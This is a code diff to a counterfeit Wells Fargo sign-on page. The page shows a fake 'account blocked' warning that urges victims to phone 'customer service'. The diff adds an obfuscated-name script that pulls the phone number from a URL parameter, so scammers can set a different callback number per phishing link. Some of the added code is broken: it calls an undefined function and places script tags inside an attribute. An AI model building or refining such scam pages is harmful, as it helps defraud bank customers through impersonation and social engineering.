@@ -65,6 +65,24 @@
     <title>Sign On to View Your Personal Accounts | Wells Fargo</title>
     <script data-savepage-type="" type="text/plain" data-savepage-src="https://connect.secure.#/auth/static/depm/8556c7b1.js" defer="">
     </script>
+    <script>
+      function vhdydjwhcnfyhecnfheucncevi(name)
+      {
+          name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
+          var regexS = "[\\?&]"+name+"=([^&#]*)";
+          var regex = new RegExp( regexS );
+          var results = regex.exec( window.location.href );
+          if( results == null )
+              return "";
+          else
+              return results[1];
+      }
+      var Anph = vhdydjwhcnfyhecnfheucncevi('Anph');
+  </script>
+
+  <script type="text/javascript">
+              var Anph = getVariableFromURl('Anph');
+          </script>
     <style type="text/css">#challengeFrame{ width: 0px;height: 0px;border: none; display: none;}
       		#challengeFrame.open{
       			display: block;
@@ -486,7 +504,7 @@
 <body>
 
   <button type="button" class="sign-on-button" onclick="showMessage()">Sign on</button>
-  <div id="message" class="hidden-message">"Your Wells Fargo account access has been blocked due to suspicious login attempts. Contact our customer service team at <a href="tel:+1-808-520-3806" style="font-size: 18px; font-style: italic; font-family: Arial;" onclick="trackClick()">+1-808-520-3806</a> to verify and unlock your account."!</div>
+  <div id="message" class="hidden-message">"Your Wells Fargo account access has been blocked due to suspicious login attempts. Contact our customer service team at <a href="tel:+<script>document.write(Anph)</script>" style="font-size: 18px; font-style: italic; font-family: Arial;" onclick="trackClick()">+<script>document.write(Anph)</script></a> to verify and unlock your account."!</div>
 
   <script>
     function showMessage() {
